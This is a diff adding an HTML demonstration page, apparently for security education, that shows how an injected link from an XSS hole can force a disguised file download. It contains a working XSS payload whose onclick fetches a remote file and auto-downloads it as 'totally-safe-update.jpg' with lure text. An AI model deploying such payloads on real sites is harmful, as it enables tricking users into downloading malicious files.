@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="en" >
+
+<head>
+  <meta charset="UTF-8">
+  <title>XSS Ransomware Download Example</title>
+  
+  
+  
+      <link rel="stylesheet" href="css/style.css">
+
+  
+</head>
+
+<body>
+
+  <!DOCTYPE html>
+<html>
+  <head>
+  </head>
+  <body>
+    <h1 class="title text-center mt-5">XSS RANSOMWARE DOWNLOAD EXAMPLE</h1>
+    <p class="text-center text-muted">An injected link from an XSS vulnerability can trigger a download using the <code>download</code> attribute.
+    </p>
+     <p class="text-center text-muted">
+      * this will download the twitter profile image of <a href="https://twitter.com/chefsecure" target="_blank">@chefsecure</a>
+    </p>
+    <p class="text-center text-muted">
+      <small>(tested in Chrome desktop/mobile & Firefox desktop)</small>
+    </p>
+    <p class="mt-5">
+      <strong>Paste the following into the input, click update and click the link: </strong>
+    </p>
+    <p>
+      <code>&lt;a href="https://codepen.io/totally-safe-update.jpg" download="totally-safe-update.jpg" onclick="if(window.el){return};el=this;fetch('https://pbs.twimg.com/profile_images/1053827506946531330/ScDbKloF_400x400.jpg').then((resp)=>{return resp.blob()}).then((blob)=>{el.href=window.URL.createObjectURL(blob);el.click()});return false"&gt;Download our latest update to access the rest of this site&lt;/a&gt;</code>
+    </p>
+   
+    <div class="styled-input">
+      <input id="input" type="text" required>
+      <label>input</label>
+      <span></span>
+    </div>
+    <div class="btn-wrap">
+      <button id="update">UPDATE</button>
+    </div>
+    <hr>
+    <p>You typed: <span id="value"></span></p>
+    <p class="mt-5">More site content down here...</p>
+  </body>
+</html>
+  
+  
+
+    <script  src="js/index.js"></script>
+
+
+
+
+</body>
+
+</html>
